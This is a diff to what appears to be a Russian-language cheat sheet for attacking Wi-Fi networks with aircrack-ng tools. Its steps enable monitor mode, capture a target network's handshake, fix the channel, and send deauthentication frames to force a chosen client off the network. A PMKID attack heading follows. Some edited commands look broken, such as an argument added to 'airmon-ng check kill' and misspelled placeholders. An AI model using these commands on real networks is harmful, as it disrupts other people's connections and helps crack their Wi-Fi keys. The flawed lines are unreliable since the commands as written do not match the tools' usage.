@@ -11,7 +11,7 @@ sudo rfkill unblock wifi    # Разблокировать
 sudo airmon-ng check
 
 ## 2. Убить процессы, которые мешают
-sudo airmon-ng check kill
+sudo airmon-ng check kill PID
 
 ## 3. Включить режим мониторинга
 sudo airmon-ng start wlan0
@@ -27,8 +27,16 @@ sudo airodump-ng wlan0mon
 # Захват на конкретном канале и BSSID
 sudo airodump-ng -c <КАНАЛ> --bssid <BSSID> -w capture wlan0mon
 
+
+# Установить соответствующий канал
+
+sudo iw dev wlan0mon set channel 1
+
 # В другом терминале: деаутентификация клиента
-sudo aireplay-ng -0 2 -a <BSSID> wlan0mon
+sudo aireplay-ng --deauth 5 -a BSID wlan0mon -c MAC(STATION)
+
+# Проверка что канал зафиксирован
+sudo iw dev wlan0mon info
 
 ### PMKID атака (без клиента)
 
